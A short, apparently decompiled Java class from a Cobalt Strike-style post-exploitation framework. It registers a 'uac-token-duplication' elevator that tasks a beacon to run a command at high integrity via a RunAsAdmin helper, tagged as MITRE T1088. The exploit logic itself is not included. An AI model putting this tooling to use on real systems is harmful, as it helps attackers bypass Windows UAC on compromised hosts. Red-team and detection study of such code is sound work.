package beacon.elevators;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconElevators;
import beacon.TaskBeacon;
import beacon.inline.RunAsAdmin;

public class BypassUACToken implements BeaconElevators.Elevator {
   protected AggressorClient client;

   public BypassUACToken(AggressorClient var1) {
      this.client = var1;
      DataUtils.getBeaconElevators(var1.getData()).register("uac-token-duplication", "Bypass UAC with Token Duplication", this);
   }

   public void runasadmin(String var1, String var2) {
      (new TaskBeacon(this.client, new String[0])).log_task(var1, "Tasked beacon to run " + var2 + " in a high integrity context (uac-token-duplication)", "T1088");
      (new RunAsAdmin(this.client, var2)).go(var1);
   }
}
